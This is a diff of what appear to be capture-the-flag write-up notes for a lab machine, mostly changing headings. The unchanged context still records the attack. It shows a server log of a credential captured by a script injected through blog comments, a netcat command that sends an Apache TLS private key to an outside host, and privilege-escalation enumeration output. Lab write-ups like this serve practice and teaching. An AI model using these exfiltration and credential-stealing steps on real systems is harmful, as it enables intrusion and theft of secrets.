@@ -119,9 +119,7 @@ call script by adding comments on blog page
 log from http server
 10.10.240.147 - - [11/Jan/2024 03:53:19] "GET /stealer4.js?jack:WhyIsMyPasswordSoStrongIDK HTTP/1.1" 200 -
 
-</code>
-
-<h1> PrivEscation </h1>
+<h2> PrivEscation lateral moving </h2>
 ╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                            
 Matching Defaults entries for jack on ubuntu:                                                               
@@ -134,7 +132,7 @@ jack@ubuntu:/opt$ ls
 capture.pcap  urgent.txt
 
 ---
-<h2>after analysing captured packet found <\h2>
+<h3>after analysing captured packet found <\h3>
   
 you need TLS key for decryption 
 jack@ubuntu:/opt$ nc -w 3 10.9.30.202 4444 < ../etc/apache2/certs/apache.key 
@@ -171,6 +169,6 @@ jack@ubuntu:/opt$ ss -tlnup | grep "41312"
 tcp   LISTEN 0      511               0.0.0.0:41312        0.0.0.0:*        
 
 
-
+</code>
 
 
